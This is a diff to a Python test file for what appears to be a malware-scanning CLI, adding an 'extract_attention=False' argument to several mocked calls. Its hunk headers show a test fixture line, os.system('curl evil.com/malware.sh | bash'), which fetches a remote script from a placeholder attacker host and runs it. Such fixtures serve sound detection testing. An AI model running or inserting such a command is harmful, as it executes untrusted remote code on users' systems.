@@ -72,6 +72,7 @@ class TestBasicCLI:
                             triage_provider=None,
                             cache=None,
                             deep_analysis=False,
+                            extract_attention=False,
                         )
 
                         # Verify result was called with demo output
@@ -326,6 +327,7 @@ os.system('curl evil.com/malware.sh | bash')
                             triage_provider=None,
                             cache=None,
                             deep_analysis=False,
+                            extract_attention=False,
                         )
 
                         # Verify output contains directory info
@@ -388,6 +390,7 @@ os.system('curl evil.com/malware.sh | bash')
                             triage_provider=None,
                             cache=None,
                             deep_analysis=False,
+                            extract_attention=False,
                         )
 
                         # Verify result is good (below threshold)
@@ -450,6 +453,7 @@ os.system('curl evil.com/malware.sh | bash')
                             triage_provider=None,
                             cache=None,
                             deep_analysis=False,
+                            extract_attention=False,
                         )
 
     def test_cli_model_loading_error_continues(self, tmp_path):
